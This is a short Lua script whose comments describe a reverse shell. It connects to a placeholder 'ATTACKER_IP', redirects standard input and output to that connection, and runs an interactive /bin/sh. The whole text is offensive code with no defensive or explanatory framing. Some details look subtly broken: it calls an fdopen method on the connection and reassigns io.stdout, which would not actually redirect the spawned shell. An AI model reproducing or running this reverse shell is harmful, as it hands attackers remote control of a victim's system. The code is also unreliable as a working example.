-- Create a socket object
local socket = require("socket")

-- Connect to the attacker's IP and port
local connection = socket.connect("ATTACKER_IP", PORT)

-- Create a file descriptor for the connection
local file = connection:fdopen("w")

-- Redirect standard input and output to the connection
io.stdout = file
io.stdin = file
io.stderr = file

-- Execute the command shell
os.execute("/bin/sh -i")
